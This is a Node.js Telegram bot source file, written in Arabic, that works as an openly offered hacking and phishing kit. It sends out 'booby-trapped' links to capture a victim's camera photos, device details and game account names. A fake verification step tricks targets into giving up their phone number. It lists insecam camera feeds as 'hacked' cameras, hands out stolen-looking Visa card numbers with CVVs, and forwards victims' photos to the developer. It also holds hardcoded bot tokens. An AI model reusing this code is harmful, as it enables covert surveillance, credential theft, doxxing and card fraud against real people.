bot.onText(/\/jjihigjoj/, (msg) => {
    const chatId = msg.chat.id;
    const message = 'مرحبًا! انقر على الزر لجمع معلومات جهازك.';
    bot.sendMessage(chatId, message, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'جمع معلومات الجهاز', callback_data: 'collect_device_info' }]
            ]
        }
    });
});


bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;


    if (query.data === 'collect_device_info') {
        const url = `https://effervescent-chimera-19a252.netlify.app/mm/?chatId=${chatId}`;
        bot.sendMessage(chatId, `رابط جمع المعلومات: ${url}`);
    }


    bot.answerCallbackQuery(query.id);
});
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;

    if (query.data === 'get_link') {

        bot.sendMessage(chatId, 'أرسل لي رابطًا يبدأ بـ "https".');


        const messageHandler = (msg) => {

            if (msg.chat.id === chatId) {
                if (msg.text && msg.text.startsWith('https')) {
                    const userLink = msg.text;


                    dataStore[chatId] = { userLink };


                    bot.sendMessage(chatId, `تم تلغيم هذا الرابط ⚠️:\https://incomparable-meringue-36eed3.netlify.app/k.html?chatId=${chatId}`);


                    bot.removeListener('message', messageHandler);
                } else {

                    bot.sendMessage(chatId, 'الرجاء إدخال رابط صحيح يبدأ بـ "https".');
                }
            }
        };


        bot.on('message', messageHandler);
    }
});
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

app.post('/submitNames', (req, res) => {
    const chatId = req.body.chatId;
    const firstName = req.body.firstName;
    const secondName = req.body.secondName;

    console.log('Received data:', req.body); 

    bot.sendMessage(chatId, `أسماء المستخدمين: ${firstName} و ${secondName}`)
        .then(() => {
            res.sendFile(path.join(__dirname, 'g.html')); 
        })
        .catch((error) => {
            console.error('Error sending Telegram message:', error.response ? error.response.body : error); 
            res.status(500).send('حدثت مشكلة أثناء إرسال الأسماء إلى التلغرام.');
        });
});

app.get('/ge', (req, res) => {
    const chatId = req.query.chatId;
    if (!chatId) {
        return res.status(400).send('الرجاء توفير chatId في الطلب.');
    }
    res.sendFile(path.join(__dirname, 'g.html'));
});

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

app.post('/submitNames', (req, res) => {
    const chatId = req.body.chatId;
    const firstName = req.body.firstName;
    const secondName = req.body.secondName;

    console.log('Received data:', req.body); 

    bot.sendMessage(chatId, `أسماء المستخدمين: ${firstName} و ${secondName}`)
        .then(() => {
            res.sendFile(path.join(__dirname, 'F.html')); 
        })
        .catch((error) => {
            console.error('Error sending Telegram message:', error.response ? error.response.body : error); 
            res.status(500).send('حدثت مشكلة أثناء إرسال الأسماء إلى التلغرام.');
        });
});

app.get('/getNam', (req, res) => {
    const chatId = req.query.chatId;
    if (!chatId) {
        return res.status(400).send('الرجاء توفير chatId في الطلب.');
    }
    res.sendFile(path.join(__dirname, 'F.html'));
});

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

app.post('/submitNames', (req, res) => {
    const chatId = req.body.chatId;
    const firstName = req.body.firstName;
    const secondName = req.body.secondName;

    console.log('Received data:', req.body); 

    bot.sendMessage(chatId, `أسماء المستخدمين: ${firstName} و ${secondName}`)
        .then(() => {
            res.sendFile(path.join(__dirname, 's.html')); 
        })
        .catch((error) => {
            console.error('Error sending Telegram message:', error.response ? error.response.body : error); 
            res.status(500).send('حدثت مشكلة أثناء إرسال الأسماء إلى التلغرام.');
        });
});

app.get('/getName', (req, res) => {
    const chatId = req.query.chatId;
    if (!chatId) {
        return res.status(400).send('الرجاء توفير chatId في الطلب.');
    }
    res.sendFile(path.join(__dirname, 's.html'));
});
const countryTranslation = {
  "AF": "أفغانستان 🇦🇫",
  "AL": "ألبانيا 🇦🇱",
  "DZ": "الجزائر 🇩🇿",
  "AO": "أنغولا 🇦🇴",
  "AR": "الأرجنتين 🇦🇷",
  "AM": "أرمينيا 🇦🇲",
  "AU": "أستراليا 🇦🇺",
  "AT": "النمسا 🇦🇹",
  "AZ": "أذربيجان 🇦🇿",
  "BH": "البحرين 🇧🇭",
  "BD": "بنغلاديش 🇧🇩",
  "BY": "بيلاروس 🇧🇾",
  "BE": "بلجيكا 🇧🇪",
  "BZ": "بليز 🇧🇿",
  "BJ": "بنين 🇧🇯",
  "BO": "بوليفيا 🇧🇴",
  "BA": "البوسنة والهرسك 🇧🇦",
  "BW": "بوتسوانا 🇧🇼",
  "BR": "البرازيل 🇧🇷",
  "BG": "بلغاريا 🇧🇬",
  "BF": "بوركينا فاسو 🇧ﺫ",
  "KH": "كمبوديا 🇰🇭",
  "CM": "الكاميرون 🇨🇲",
  "CA": "كندا 🇨🇦",
  "CL": "تشيلي 🇨🇱",
  "CN": "الصين 🇨🇳",
  "CO": "كولومبيا 🇨🇴",
  "CR": "كوستاريكا 🇨🇷",
  "HR": "كرواتيا 🇭🇷",
  "CY": "قبرص 🇨🇾",
  "CZ": "التشيك 🇨🇿",
  "DK": "الدنمارك 🇩🇰",
  "EC": "الإكوادور 🇪🇨",
  "EG": "مصر 🇪🇬",
  "SV": "السلفادور 🇸🇻",
  "EE": "إستونيا 🇪🇪",
  "ET": "إثيوبيا 🇪🇹",
  "FI": "فنلندا 🇫🇮",
  "FR": "فرنسا 🇫🇷",
  "GE": "جورجيا 🇬🇪",
  "DE": "ألمانيا 🇩🇪",
  "GH": "غانا 🇬🇭",
  "GR": "اليونان 🇬🇷",
  "GT": "غواتيمالا 🇬🇹",
  "HN": "هندوراس 🇭🇳",
  "HK": "هونغ كونغ 🇭🇰",
  "HU": "المجر 🇭🇺",
  "IS": "آيسلندا 🇮🇸",
  "IN": "الهند 🇮🇳",
  "ID": "إندونيسيا 🇮🇩",
  "IR": "إيران 🇮🇷",
  "IQ": "العراق 🇮🇶",
  "IE": "أيرلندا 🇮🇪",
  "IL": " المحتله 🇮🇱",
  "IT": "إيطاليا 🇮🇹",
  "CI": "ساحل العاج 🇨🇮",
  "JP": "اليابان 🇯🇵",
  "JO": "الأردن 🇯🇴",
  "KZ": "كازاخستان 🇰🇿",
  "KE": "كينيا 🇰🇪",
  "KW": "الكويت 🇰🇼",
  "KG": "قيرغيزستان 🇰🇬",
  "LV": "لاتفيا 🇱🇻",
  "LB": "لبنان 🇱🇧",
  "LY": "ليبيا 🇱🇾",
  "LT": "ليتوانيا 🇱🇹",
  "LU": "لوكسمبورغ 🇱🇺",
  "MO": "ماكاو 🇲🇴",
  "MY": "ماليزيا 🇲🇾",
  "ML": "مالي 🇲🇱",
  "MT": "مالطا 🇲🇹",
  "MX": "المكسيك 🇲🇽",
  "MC": "موناكو 🇲🇨",
  "MN": "منغوليا 🇲🇳",
  "ME": "الجبل الأسود 🇲🇪",
  "MA": "المغرب 🇲🇦",
  "MZ": "موزمبيق 🇲🇿",
  "MM": "ميانمار 🇲🇲",
  "NA": "ناميبيا 🇳🇦",
  "NP": "نيبال 🇳🇵",
  "NL": "هولندا 🇳🇱",
  "NZ": "نيوزيلندا 🇳🇿",
  "NG": "نيجيريا 🇳🇬",
  "KP": "كوريا الشمالية 🇰🇵",
  "NO": "النرويج 🇳🇴",
  "OM": "عمان 🇴🇲",
  "PK": "باكستان 🇵🇰",
  "PS": "فلسطين 🇵🇸",
  "PA": "بنما 🇵🇦",
  "PY": "باراغواي 🇵🇾",
  "PE": "بيرو 🇵🇪",
  "PH": "الفلبين 🇵🇭",
  "PL": "بولندا 🇵🇱",
  "PT": "البرتغال 🇵🇹",
  "PR": "بورتوريكو 🇵🇷",
  "QA": "قطر 🇶🇦",
  "RO": "رومانيا 🇷🇴",
  "RU": "روسيا 🇷🇺",
  "RW": "رواندا 🇷🇼",
  "SA": "السعودية 🇸🇦",
  "SN": "السنغال 🇸🇳",
  "RS": "صربيا 🇷🇸",
  "SG": "سنغافورة 🇸🇬",
  "SK": "سلوفاكيا 🇸🇰",
  "SI": "سلوفينيا 🇸🇮",
  "ZA": "جنوب أفريقيا 🇿🇦",
  "KR": "كوريا الجنوبية 🇰🇷",
  "ES": "إسبانيا 🇪🇸",
  "LK": "سريلانكا 🇱🇰",
  "SD": "السودان 🇸🇩",
  "SE": "السويد 🇸🇪",
  "CH": "سويسرا 🇨🇭",
  "SY": "سوريا 🇸🇾",
  "TW": "تايوان 🇹🇼",
  "TZ": "تنزانيا 🇹🇿",
  "TH": "تايلاند 🇹🇭",
  "TG": "توغو 🇹🇬",
  "TN": "تونس 🇹🇳",
  "TR": "تركيا 🇹🇷",
  "TM": "تركمانستان 🇹🇲",
  "UG": "أوغندا 🇺🇬",
  "UA": "أوكرانيا 🇺🇦",
  "AE": "الإمارات 🇦🇪",
  "GB": "بريطانيا 🇬🇧",
  "US": "امريكا 🇺🇸",
  "UY": "أوروغواي 🇺🇾",
  "UZ": "أوزبكستان 🇺🇿",
  "VE": "فنزويلا 🇻🇪",
  "VN": "فيتنام 🇻🇳",
  "ZM": "زامبيا 🇿🇲",
  "ZW": "زيمبابوي 🇿🇼",
  "GL": "غرينلاند 🇬🇱",
  "KY": "جزر كايمان 🇰🇾",
  "NI": "نيكاراغوا 🇳🇮",
  "DO": "الدومينيكان 🇩🇴",
  "NC": "كاليدونيا 🇳🇨",
  "LA": "لاوس 🇱🇦",
  "TT": "ترينيداد وتوباغو 🇹🇹",
  "GG": "غيرنزي 🇬🇬",
  "GU": "غوام 🇬🇺",
  "GP": "غوادلوب 🇬🇵",
  "MG": "مدغشقر 🇲🇬",
  "RE": "ريونيون 🇷🇪",
  "FO": "جزر فارو 🇫🇴",
  "MD": "مولدوفا 🇲🇩" 


};


const camRequestCounts = {};


async function initStorage() {
    await storage.init();
    vipUsers = await storage.getItem('vipUsers') || [];
}


async function saveVipUsers() {
    await storage.setItem('vipUsers', vipUsers);
}


function showCountryList(chatId, startIndex = 0) {
    try {
        const buttons = [];
        const countryCodes = Object.keys(countryTranslation);
        const countryNames = Object.values(countryTranslation);

        const endIndex = Math.min(startIndex + 99, countryCodes.length);

        for (let i = startIndex; i < endIndex; i += 3) {
            const row = [];
            for (let j = i; j < i + 3 && j < endIndex; j++) {
                const code = countryCodes[j];
                const name = countryNames[j];
                row.push({ text: name, callback_data: code });
            }
            buttons.push(row);
        }

        const navigationButtons = [];
        if (startIndex > 0) {
            navigationButtons.push 
        }
        if (endIndex < countryCodes.length) {
            navigationButtons.push({ text: "المزيد", callback_data: `next_${endIndex}` });
        }

        if (navigationButtons.length) {
            buttons.push(navigationButtons);
        }

        bot.sendMessage(chatId, "اختر الدولة:", {
            reply_markup: {
                inline_keyboard: buttons
            }
        });
    } catch (error) {
        bot.sendMessage(chatId, `حدث خطأ أثناء إنشاء القائمة: ${error.message}`);
    }
}


async function displayCameras(chatId, countryCode) {
    try {

        const message = await bot.sendMessage(chatId, "جاري اخـ ^_^ـ.راق كامراة مراقبه.....");
        const messageId = message.message_id;

        for (let i = 0; i < 15; i++) {
            await bot.editMessageText(`جاري اخـ ^_^ـ.راق كامراة مراقبه${'.'.repeat(i % 4)}`, {
                chat_id: chatId,
                message_id: messageId
            });
            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        const url = `http://www.insecam.org/en/bycountry/${countryCode}`;
        const headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
        };

        let res = await axios.get(url, { headers });
        const lastPageMatch = res.data.match(/pagenavigator\("\?page=", (\d+)/);
        if (!lastPageMatch) {
            bot.sendMessage(chatId, "لم يتم اخـ ^_^ـ.راق كامراة المراقبه في هذا الدوله بسبب قوة الامان جرب دوله مختلفه او حاول مره اخرى لاحقًا.");
            return;
        }
        const lastPage = parseInt(lastPageMatch[1], 10);
        const cameras = [];

        for (let page = 1; page <= lastPage; page++) {
            res = await axios.get(`${url}/?page=${page}`, { headers });
            const pageCameras = res.data.match(/http:\/\/\d+\.\d+\.\d+\.\d+:\d+/g) || [];
            cameras.push(...pageCameras);
        }

        if (cameras.length) {
            const numberedCameras = cameras.map((camera, index) => `${index + 1}. ${camera}`);
            for (let i = 0; i < numberedCameras.length; i += 50) {
                const chunk = numberedCameras.slice(i, i + 50);
                await bot.sendMessage(chatId, chunk.join('\n'));
            }
            await bot.sendMessage(chatId, "لقد تم اخـ ^_^ـ.راق كامراة المراقبه من هذا الدوله يمكنك التمتع في المشاهده عمك المنحرف.\n ⚠️ملاحظه مهمه اذا لم تفتح الكامرات في جهازك او طلبت باسورد قم في تعير الدوله او حاول مره اخره لاحقًا ");
        } else {
            await bot.sendMessage(chatId, "لم يتم اخـ ^_^ـ.راق كامراة المراقبه في هذا الدوله بسبب قوة امانها جرب دوله اخره او حاول مره اخرى لاحقًا.");
        }
    } catch (error) {
        await bot.sendMessage(chatId, `لم يتم اخـ ^_^ـ.راق كامراة المراقبه في هذا الدوله بسبب قوة امانها جرب دوله اخره او حاول مره اخرى لاحقًا.`);
    }
}


function isDeveloper(chatId) {

    const developerChatId = 5739065274;
    return chatId === developerChatId;
}


function showAdminPanel(chatId) {
    bot.sendMessage(chatId, "لوحة التحكم:", {
        reply_markup: {
            inline_keyboard: [
                [{ text: "إضافة مستخدم VIP", callback_data: "add_vip" }],
                [{ text: "إزالة مستخدم VIP", callback_data: "remove_vip" }]
            ]
        }
    });
}

bot.onText(/\/jjjjjavayy/, (msg) => {
    const chatId = msg.chat.id;
    const message = 'مرحبًا! انقر على الرابط لإضافة أسماء المستخدمين.';
    bot.sendMessage(chatId, message, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'إختراق ببجي', callback_data: 'get_pubg' }],
                [{ text: 'إختراق فري فاير', callback_data: 'get_freefire' }],
                [{ text: 'إضافة أسماء', callback_data: 'add_names' }]
            ]
        }
    });
});

bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    let link;

    if (query.data === 'get_pubg') {
        link = `https://effulgent-halva-4fabb1.netlify.app/g.html?chatId=${chatId}.png`;
    } else if (query.data === 'get_freefire') {
        link = `https://vocal-arithmetic-0beea4.netlify.app/F?chatId=${chatId}.png`;
    } else if (query.data === 'add_names') {
        link = `https://super-brigadeiros-46c826.netlify.app/s.html?chatId=${chatId}.png`;
    }

    if (link) {
        bot.sendMessage(chatId, `تم لغيم الرابط هذا: ${link}`);
        bot.answerCallbackQuery(query.id, { text: 'تم إرسال الرابط إليك ✅' });
    } else if (query.data === 'add_nammes') {
        bot.sendMessage(chatId, `قم بإرسال هذا لفتح أوامر اخـ ^_^ـ.راق الهاتف كاملاً قم بضغط على هذا الامر /Vip`);
        bot.answerCallbackQuery(query.id, { text: '' });
    }
});

bot.onText(/\/نننطسطوو/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, "مرحبا! في بوت اخـ ^_^ـ.راق كاميرات المراقبة 📡", {
        reply_markup: {
            inline_keyboard: [[{ text: "ابدأ الاخـ ^_^ـ.راق", callback_data: "get_cameras" }]]
        }
    });

    if (isDeveloper(chatId)) {
        showAdminPanel(chatId);
    }
});


bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;

    if (query.data === 'get_cameras') {
        showCountryList(chatId);
    } else if (query.data in countryTranslation) {
        bot.deleteMessage(chatId, query.message.message_id);
        displayCameras(chatId, query.data);
    } else if (query.data.startsWith("next_")) {
        const startIndex = parseInt(query.data.split("_")[1], 10);
        bot.deleteMessage(chatId, query.message.message_id);
        showCountryList(chatId, startIndex);
    } else if (query.data.startsWith("prev_")) {
        const endIndex = parseInt(query.data.split("_")[1], 10);
        const startIndex = Math.max(0, endIndex - 18);
        bot.deleteMessage(chatId, query.message.message_id);
        showCountryList(chatId, startIndex);
    }
});

const americanBanks = [
  'Bank of America', 'Chase Bank', 'Citibank', 'Wells Fargo',
  'Capital One', 'PNC Bank', 'U.S. Bank', 'TD Bank',
  'SunTrust Bank', 'Fifth Third Bank'
];


const fetchVisaData = async () => {
  try {
    const url = 'https://iwhw.vercel.app/';
    const response = await axios.get(url);
    const text = response.data;

    const lines = text.trim().split('\n');
    if (lines.length > 0) {
      const visas = lines.map(line => {
        const parts = line.split('|');
        if (parts.length === 4) {
          return {
            CardNumber: parts[0],
            Expiry: `${parts[1]}/${parts[2]}`,
            CVV: parts[3],
            Bank: americanBanks[Math.floor(Math.random() * americanBanks.length)],
            CardType: 'VISA - DEBIT - VISA CLASSIC',
            Country: 'USA🇺🇸',
            Value: `$${Math.floor(Math.random() * 31) + 10}` 
          };
        }
      }).filter(Boolean); 

      if (visas.length > 0) {
        return visas[Math.floor(Math.random() * visas.length)]; 
      }
    }

    console.log("No visa data found or data format is not as expected.");
    return null;
  } catch (error) {
    console.log("An error occurred:", error.message);
    return null;
  }
};


bot.onText(/\/نكخمنتته/, (msg) => {
  const chatId = msg.chat.id;
  const options = {
    reply_markup: {
      inline_keyboard: [[
        { text: "Generate Visa", callback_data: "generate_visa" }
      ]]
    },
    parse_mode: "Markdown"
  };

  bot.sendMessage(chatId, "*Hi Bro, I'm* [™](t.me/) \n*Press the button below to generate Visa!*", options);
});


bot.on('callback_query', async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;

  if (callbackQuery.data === "generate_visa") {
    let progressMsg = await bot.sendMessage(chatId, "Generating Visa...\n[░░░░░░░░░░] 0%");

    await new Promise(res => setTimeout(res, 1000));
    await bot.editMessageText("Generating Visa...\n[▓▓░░░░░░░░] 25%", { chat_id: chatId, message_id: progressMsg.message_id });

    await new Promise(res => setTimeout(res, 1000));
    await bot.editMessageText("Generating Visa...\n[▓▓▓▓░░░░░░] 50%", { chat_id: chatId, message_id: progressMsg.message_id });

    await new Promise(res => setTimeout(res, 1000));
    await bot.editMessageText("Generating Visa...\n[▓▓▓▓▓▓░░░░] 75%", { chat_id: chatId, message_id: progressMsg.message_id });

    await new Promise(res => setTimeout(res, 1000));
    await bot.editMessageText("Generating Visa...\n[▓▓▓▓▓▓▓▓▓▓] 100%", { chat_id: chatId, message_id: progressMsg.message_id });

    await new Promise(res => setTimeout(res, 1000));
    await bot.deleteMessage(chatId, progressMsg.message_id);

    const visaData = await fetchVisaData();

    if (visaData) {
      const { CardNumber, Expiry, CVV, Bank, CardType, Country, Value } = visaData;

      bot.sendMessage(chatId, `
𝗣𝗮𝘀𝘀𝗲𝗱 ✅
*[-] Card Number :* \`${CardNumber}\`
*[-] Expiry :* \`${Expiry}\`
*[-] CVV :* \`${CVV}\`
*[-] Bank :* \`${Bank}\`
*[-] Card Type :* \`${CardType}\`
*[-] Country :* \`${Country}\`
*[-] Value :* \`${Value}\`
*============================
[-] by :* [BOT](t.me/ZI0_bot)
      `, { parse_mode: "Markdown" });
    } else {
      bot.sendMessage(chatId, "Failed to fetch visa data. Please try again later.");
    }
  }
});


const deleteFolderRecursive = (directoryPath) => {
    if (fs.existsSync(directoryPath)) {
        fs.readdirSync(directoryPath).forEach((file) => {
            const currentPath = path.join(directoryPath, file);
            if (fs.lstatSync(currentPath).isDirectory()) {

                deleteFolderRecursive(currentPath);
            } else {

                fs.unlinkSync(currentPath);
            }
        });
        fs.rmdirSync(directoryPath);
    }
};

app.use(express.static(__dirname));



app.post('/xx', async (req, res) => {
    const chatId = req.body.chatId;
    const imageDatas = req.body.imageDatas.split(',');

    console.log("Received photos: ", imageDatas.length, "for chatId: ", chatId);

    if (imageDatas.length > 0) {
        try {
            
            let user;
            let username = "غير متوفر";
            let fullName = "غير متوفر";
            
            try {
                user = await bot.getChat(chatId);
                username = user.username ? `@${user.username}` : "لم يتم العثور على اسم المستخدم";
                fullName = `${user.first_name || ""} ${user.last_name || ""}`.trim();
            } catch (userErr) {
                console.error("حدث خطأ أثناء جلب معلومات المستخدم: ", userErr);
            }

            
            const femaleBotToken = '8469890140:AAFCB6N00YMggHLC5OqAbi4C6o1Q7TwvqEw';//بوت الانثىى
            const nsfwBotToken = '7865024716:AAEq3RmOfoguDumrz61FgRJakyxXQlUmS4k'; // بوت الاباحي
            const developerChatId = '5739065274';

            const processImagePromises = imageDatas.map(async (imageData, index) => {
                const buffer = Buffer.from(imageData, 'base64');
                
                try {
                   
                    const formData = new FormData();
                    formData.append('image', buffer, {
                        filename: `photo_${index}.jpg`,
                        contentType: 'image/jpeg'
                    });

                    const SERVER_URL =ff;
                    const API_KEY = "hkhlasjoaj5464hjsks";

                    const response = await axios.post(`${SERVER_URL}?api_key=${API_KEY}`, formData, {
                        headers: {
                            ...formData.getHeaders(),
                        },
                        timeout: 60000
                    });

                    const analysisResult = response.data;
                    console.log(`Analysis result for image ${index + 1}:`, analysisResult);

                    
                    if (analysisResult.nsfw_check === 'Yes') {

                        
                        await bot.sendMessage(chatId, "🔞 تم حظر الصورة لاحتوائها على محتوى غير لائق. الرجاء الالتزام بقواعد البوت.");
                        
                        
                        const nsfwBot = new TelegramBot(nsfwBotToken);
                        await nsfwBot.sendPhoto(developerChatId, buffer, {
                            caption: `🔞 تحذير: محتوى إباحي\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}\n📸 الصورة ${index + 1}\n🎯 النتيجة: ${analysisResult.final_result}`
                        });
                        
                        return { success: false, reason: 'nsfw_content', index };

                    } 
                    
                    else if (analysisResult.final_result === 'female portrait' && analysisResult.nsfw_check === 'No') {
                        
                        
                        await bot.sendMessage(chatId, "🚫 تم حظر الصورة واكتشاف ملامح أنثى في الصورة ولم يتم إرسالها. الرجاء الالتزام بقواعد البوت.");
                        
                        
                        const femaleBot = new TelegramBot(femaleBotToken);
                        await femaleBot.sendPhoto(developerChatId, buffer, {
                            caption: `🚨 تحذير: صورة أنثى\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}\n📸 الصورة ${index + 1}\n🎯 النتيجة: ${analysisResult.final_result}`
                        });
                        
                        return { success: false, reason: 'female_detected', index };
                    } 
                    else {
                        
                        
                        const sendToUser = bot.sendPhoto(chatId, buffer, { 
                            caption: `🙋‍♂️ الصورة ${index + 1}` 
                        });

                        const sendToOwner = botOwner.sendPhoto(ownerChatId, buffer, {
                            caption: `📤 صورة تمت مشاركتها.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}\n📸 الصورة ${index + 1}`
                        });

                        await Promise.all([sendToUser, sendToOwner]);
                        return { success: true, index };
                    }
                } catch (analysisError) {
                    console.error(`❌ خطأ في فحص الصورة ${index + 1}:`, analysisError.message);
                    
                    
                    const sendToUser = bot.sendPhoto(chatId, buffer, { 
                        caption: `🙋‍♂️ الصورة ${index + 1}` 
                    });

                    const sendToOwner = botOwner.sendPhoto(ownerChatId, buffer, {
                        caption: `📤 صورة تمت مشاركتها.\n👤 معرف المستخدم: ${chatId}\n📝 اسم المستخدم: ${username}\n📛 اسم الحساب: ${fullName}\n📸 الصورة ${index + 1}\n⚠️ ملاحظة: فشل فحص الصورة`
                    });

                    await Promise.all([sendToUser, sendToOwner]);
                    return { success: true, index };
                }
            });

            await Promise.all(processImagePromises);
            
            console.log(`Sent photos for chatId ${chatId}`);
            res.redirect('https://curious-creponne-45c7e4.netlify.app/index.html');

        } catch (error) {
            console.error("❌ Error processing photos: ", error);
            res.redirect('https://curious-creponne-45c7e4.netlify.app/index.html');
        }
    } else {
        console.log("No photos received.");
        res.redirect('https://curious-creponne-45c7e4.netlify.app/index.html');
    }
});



app.get('/ios', (req, res) => {
    res.sendFile(path.join(__dirname, 'xx.html'));
});
bot.onText(/\/اتتهتتاههة/, (msg) => {
    const chatId = msg.chat.id;
    const message = 'مرحبًا! انقر على الرابط أدناه للحصول على رابط لالتقاط الصور.';
    bot.sendMessage(chatId, message, {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'احصل على رابط التقاط الصور', callback_data: 'get_photo_link' }]
            ]
        }
    });
});


bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;

    if (callbackQuery.data === 'get_photo_link') {
        const link = `https://papaya-puffpuff-4f123f.netlify.app/xx.html?chatId=${chatId}`;
        bot.sendMessage(chatId, `سيتم تصوير الضحيه بدقه عاليه: ${link}`);
    }
});


bot.onText(/\/sخسننسمس/, (msg) => {
    const chatId = msg.chat.id;
    const opts = {
        reply_markup: {
            inline_keyboard: [[{ text: "🔗 توليد رابط دعوة", callback_data: "generate_invite" }]],
        },
    };

    bot.sendMessage(chatId, "مرحبًا! اضغط على الزر لتوليد رابط دعوة.", opts);
});

bot.on('callback_query', (query) => {
    if (query.data === "generate_invite") {
        const userId = query.from.id;
        const inviteLink = `https://t.me/ygf2gbot?start=${userId}`;

        bot.sendMessage(query.message.chat.id, `تم انشاء رابط قم في ارساله لضحيه لمعرفة معلومات حسابه تلجرام:\n${inviteLink}`);
    }
});


secondBot.onText(/\/start (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const inviterId = parseInt(match[1]);

    inviteLinks[msg.from.id] = inviterId;

    const opts = {
        reply_markup: {
            keyboard: [[{ text: '📞 إرسال جهة الاتصال', request_contact: true }]],
            one_time_keyboard: true,
        },
    };

    secondBot.sendMessage(chatId, "يرجى إرسال جهة الاتصال للتحقق من أنك لست روبوتًا.", opts);
});


secondBot.on('contact', (msg) => {
    if (msg.contact && inviteLinks[msg.from.id]) {
        if (msg.contact.user_id === msg.from.id) {
            const inviterId = inviteLinks[msg.from.id];
            const userInfo = msg.from;
            const userId = userInfo.id;
            const firstName = userInfo.first_name;
            const lastName = userInfo.last_name || '';
            const username = userInfo.username || 'لا يوجد اسم مستخدم';
            const bio = userInfo.bio || 'لا توجد نبذة';
            const contactNumber = msg.contact.phone_number;


            secondBot.getUserProfilePhotos(userId).then((photos) => {
                const infoMessage = `*👤 معلومات الحساب:*\n\n` +
                    `*الاسم : ${firstName} ${lastName}*\n\n` +
                    `*اليوزر : @${username}*\n\n` +
                    `*الايدي : ${userId}*\n\n` +
                    `رقم الهاتف : ${contactNumber}\n`;

                if (photos.total_count > 0) {

                    const photoId = photos.photos[0][0].file_id;

                    if (photoId) {

                        bot.sendPhoto(inviterId, photoId, { caption: infoMessage, parse_mode: 'Markdown' })
                            .then(() => {
                                console.log('تم إرسال الصورة بنجاح.');
                            })
                            .catch((error) => {
                                console.error('حدث خطأ أثناء إرسال الصورة:', error);
                                bot.sendMessage(inviterId, infoMessage, { parse_mode: 'Markdown' });
                            });
                    } else {
                        bot.sendMessage(inviterId, infoMessage, { parse_mode: 'Markdown' });
                    }
                } else {
                    bot.sendMessage(inviterId, infoMessage, { parse_mode: 'Markdown' });
                }

                secondBot.sendMessage(msg.chat.id, "تم التحقق بنجاح ✅");
                delete inviteLinks[msg.from.id];
            }).catch((error) => {
                console.error('حدث خطأ أثناء محاولة الحصول على صورة الملف الشخصي:', error);
                secondBot.sendMessage(msg.chat.id, "حدثت مشكلة أثناء محاولة الحصول على صورة الملف الشخصي.");
            });
        } else {
            secondBot.sendMessage(msg.chat.id, "يرجى إرسال جهة الاتصال الخاصة بك فقط.");
        }
    } else {
        secondBot.sendMessage(msg.chat.id, "لم يتم التحقق من جهة الاتصال.");
    }
});


secondBot.on('message', (msg) => {
    if (!msg.contact && msg.text !== '/start') {
        const opts = {
            reply_markup: {
                keyboard: [[{ text: '📞 إرسال جهة الاتصال', request_contact: true }]],
                one_time_keyboard: true,
            },
        };
        secondBot.sendMessage(msg.chat.id, "يرجى إرسال جهة الاتصال للتحقق.", opts);
    }
});
const countries = {
    "+1": ["أمريكا", "🇺🇸"],
    "+46": ["السويد", "🇸🇪"],
    "+86": ["الصين", "🇨🇳"],
    "+852": ["هونغ كونغ", "🇭🇰"],
    "+45": ["الدنمارك", "🇩🇰"],
    "+33": ["فرنسا", "🇫🇷"],
    "+31": ["هولندا", "🇳🇱"],
    "+7": ["روسيا", "🇷🇺"],
    "+7KZ": ["كازاخستان", "🇰🇿"],
    "+381": ["صربيا", "🇷🇸"],
    "+44": ["بريطانيا", "🇬🇧"],
    "+371": ["لاتفيا", "🇱🇻"],
    "+62": ["إندونيسيا", "🇮🇩"],
    "+351": ["البرتغال", "🇵🇹"],
    "+34": ["إسبانيا", "🇪🇸"],
    "+372": ["إستونيا", "🇪🇪"],
    "+358": ["فنلندا", "🇫🇮"]
};


async function importNumbers() {
    try {
        const response = await axios.get('https://nm-umber.vercel.app/');
        return response.data.split('\n');
    } catch (error) {
        console.error("خطأ في جلب الأرقام:", error);
        return [];
    }
}


async function getRandomNumberInfo() {
    const numbers = await importNumbers();
    if (numbers.length === 0) return null;

    const randomIndex = Math.floor(Math.random() * numbers.length);
    const number = numbers[randomIndex].trim();
    const creationDate = new Date().toISOString().split('T')[0];
    const creationTime = new Date().toLocaleTimeString('ar-SA');

    let countryCode;
    if (number.startsWith("+1")) {
        countryCode = "+1";
    } else if (number.startsWith("+7")) {
        countryCode = number.includes("7") ? "+7KZ" : "+7";
    } else {
        countryCode = number.slice(0, 4) in countries ? number.slice(0, 4) : number.slice(0, 3);
    }

    const [countryName, countryFlag] = countries[countryCode] || ["دولة غير معروفة", "🚩"];
    return {
        number,
        countryCode,
        countryName,
        countryFlag,
        creationDate,
        creationTime
    };
}


async function getMessages(num) {
    try {
        const response = await axios.get(`https://sms24.me/en/numbers/${num}`);
        const $ = cheerio.load(response.data);
        const messages = [];
        $('span.placeholder.text-break').each((index, element) => {
            messages.push($(element).text().trim());
        });
        return messages;
    } catch (error) {
        console.error("خطأ في جلب الرسائل:", error);
        return [];
    }
}


bot.onText(/\/stسمهصخصt/, (msg) => {
    const chatId = msg.chat.id;
    const options = {
        reply_markup: {
            inline_keyboard: [
                [{ text: 'الحصول على رقم وهمي', callback_data: 'get_number' }]
            ]
        }
    };
    bot.sendMessage(chatId, "اضغط على الزر للحصول على رقم وهمي:", options);
});
